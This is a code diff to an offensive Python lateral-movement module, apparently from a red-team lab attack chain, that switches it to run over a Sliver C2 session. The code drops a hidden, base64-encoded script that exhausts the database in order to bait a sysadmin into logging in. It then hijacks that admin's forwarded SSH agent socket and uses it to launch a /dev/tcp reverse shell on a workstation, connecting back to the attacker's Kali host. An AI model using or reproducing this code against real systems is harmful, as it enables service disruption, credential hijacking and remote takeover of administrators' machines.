@@ -5,6 +5,7 @@ import threading
 import time
 
 from chainlog import log
+from advanced_initial_access import sliver_exec
 
 # =============================================================================
 # advanced_lateral_movement.py — Sysadmin Baiting & SSH Agent Hijacking
@@ -94,24 +95,23 @@ def _run_remote(shell, cmd, timeout=10):
     return buf.strip()
 
 
-def _fire_reverse_shell_via_agent(root_shell, socket_path, target_user, target_ip, kali_host, kali_port):
+def _fire_reverse_shell_via_agent(root_sliver_session, socket_path, target_user, target_ip, kali_host, kali_port):
     """
     Use the hijacked SSH agent socket to SSH into Vinzenz's workstation
     and fire a reverse shell back to Kali.
     """
     ssh_cmd = (
-        f"SSH_AUTH_SOCK={socket_path} ssh "
+        f"execute -o -- sh -c 'SSH_AUTH_SOCK={socket_path} ssh "
         f"-o StrictHostKeyChecking=accept-new "
         f"-o UserKnownHostsFile=/dev/null "
         f"-p 22 "
         f"{target_user}@{target_ip} "
-        f'"bash -i > /dev/tcp/{kali_host}/{kali_port} 2>/dev/null 0>&1" '
-        f">/dev/null 2>&1 &"
+        f"\"bash -i > /dev/tcp/{kali_host}/{kali_port} 2>/dev/null 0>&1\"'"
     )
-    send_command(root_shell, ssh_cmd)
+    sliver_exec(root_sliver_session, ssh_cmd)
 
 
-def run(root_shell, kali_host=KALI_HOST, target_ip=VINZENZ_WS_IP,
+def run(root_sliver_session, kali_host=KALI_HOST, target_ip=VINZENZ_WS_IP,
         target_user=VINZENZ_USER, target_port=PORT_VINZENZ):
     """
     Execute the advanced lateral movement scenario.
@@ -143,8 +143,11 @@ except Exception as e:
     pass
 time.sleep(600)
 """
-    _run_remote(root_shell, f"cat << 'EOF' > /tmp/.db_hang.py\n{py_script}EOF")
-    _run_remote(root_shell, "python3 /tmp/.db_hang.py >/dev/null 2>&1 &")
+    # Write script to target
+    b64_script = __import__('base64').b64encode(py_script.encode()).decode()
+    sliver_exec(root_sliver_session, f"execute -o -- sh -c 'echo {b64_script} | base64 -d > /tmp/.db_hang.py'")
+    # Execute script in background
+    sliver_exec(root_sliver_session, "execute -o -- setsid -f python3 /tmp/.db_hang.py")
     
     log("[+] DB connections maxed out. Legitimate requests will now fail with 503.")
 
@@ -169,17 +172,22 @@ time.sleep(600)
     
     while time.time() < deadline:
         # Check for ssh agent sockets
-        out = _run_remote(root_shell, "find /tmp -type s -name 'agent.*' 2>/dev/null | head -n 1")
+        out = sliver_exec(root_sliver_session, "execute -o -- sh -c 'find /tmp -type s -name \"agent.*\" 2>/dev/null | head -n 1'")
         if out and "agent." in out:
-            socket_path = out.strip()
-            break
+            # Parse the actual path from sliver output
+            for line in out.splitlines():
+                if "/tmp/ssh-" in line and "/agent." in line:
+                    socket_path = line.strip()
+                    break
+            if socket_path:
+                break
         time.sleep(2)
         
     if not socket_path:
         log("[-] Timeout waiting for sysadmin SSH login.")
         log("    → Did you simulate the login? (e.g. ssh -A root@apache)")
         vinzenz_server.close()
-        _run_remote(root_shell, "pkill -f .db_hang.py") # cleanup
+        sliver_exec(root_sliver_session, "execute -o -- pkill -f .db_hang.py") # cleanup
         return {"vinzenz_shell": None}
         
     log(f"[+] WATCHER ALERT: SSH Agent socket found at {socket_path}")
@@ -191,7 +199,7 @@ time.sleep(600)
     
     t = threading.Thread(
         target=_fire_reverse_shell_via_agent,
-        args=(root_shell, socket_path, target_user, target_ip, kali_host, target_port),
+        args=(root_sliver_session, socket_path, target_user, target_ip, kali_host, target_port),
         daemon=True,
     )
     t.start()
@@ -203,7 +211,7 @@ time.sleep(600)
     except socket.timeout:
         log("[-] Timeout — no shell received from workstation via hijacked agent.")
         vinzenz_server.close()
-        _run_remote(root_shell, "pkill -f .db_hang.py") # cleanup
+        sliver_exec(root_sliver_session, "execute -o -- pkill -f .db_hang.py") # cleanup
         return {"vinzenz_shell": None}
     finally:
         vinzenz_server.close()
@@ -212,8 +220,8 @@ time.sleep(600)
     # Cleanup & Verify
     # ------------------------------------------------------------------
     log("[*] Cleaning up bait (admin will restart service anyway, but we are polite hackers)...")
-    _run_remote(root_shell, "pkill -f .db_hang.py")
-    _run_remote(root_shell, "rm -f /tmp/.db_hang.py")
+    sliver_exec(root_sliver_session, "execute -o -- pkill -f .db_hang.py")
+    sliver_exec(root_sliver_session, "execute -o -- rm -f /tmp/.db_hang.py")
 
     time.sleep(1)
     send_command(vinzenz_shell, "id")
